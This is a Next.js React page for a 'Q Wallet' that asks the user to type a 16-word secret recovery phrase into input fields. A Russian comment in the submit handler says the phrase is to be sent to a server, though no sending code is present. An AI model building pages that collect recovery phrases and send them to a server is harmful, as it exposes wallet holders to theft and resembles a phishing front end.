"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import styles from "./page.module.css";
import MyButton from "@/components/UI/buttons/MyButton";
import ArrowBack from "@/components/UI/arrows/arrow_back";

export default function CopyPhrase() {
    const router = useRouter();
    const [gridWords, setGridWords] = useState(Array(16).fill(""));
    const [isLoading, setIsLoading] = useState(false);

    const handleInputChange = (index, value) => {
        const newGrid = [...gridWords];
        newGrid[index] = value;
        setGridWords(newGrid);
    };

    const handleSubmit = async () => {
        setIsLoading(true);

        try {
            // Здесь отправляем фразу на сервер

            router.push("/success");
        } catch (error) {
            console.error("Error saving phrase:", error);
            alert("Error saving phrase. Please try again.");
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            <div className='header'></div>
            <div className={`main ${styles.main_special}`}>
                <div className='container'>
                    <div className={styles.arrow_wrapper}>
                        <ArrowBack onClick={() => router.back()} />
                    </div>
                    <div className={styles.main_wrapper}>
                        <p className={styles.label}>Q Wallet</p>
                        <h1 className={styles.title}>
                            Enter your secret &ensp;<span>Phrase!</span>
                        </h1>
                        <div className={styles.grid}>
                            {gridWords.map((word, index) => (
                                <input
                                    type='text'
                                    key={index}
                                    value={word}
                                    onChange={(e) =>
                                        handleInputChange(index, e.target.value)
                                    }
                                    className={styles.grid_item}
                                    placeholder={`${index + 1}.`}
                                />
                            ))}
                        </div>
                    </div>
                </div>
            </div>
            <div className='footer'>
                <div className='container'>
                    <div className={styles.footer_wrapper}>
                        <button
                            className={styles.button}
                            onClick={() => router.push("/confirm-phrase")}
                        >
                            Create a new wallet
                        </button>
                        <div className={styles.btn_wrapper}>
                            <MyButton
                                onClick={handleSubmit}
                                isLoading={isLoading}
                            >
                                Finish
                            </MyButton>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
}
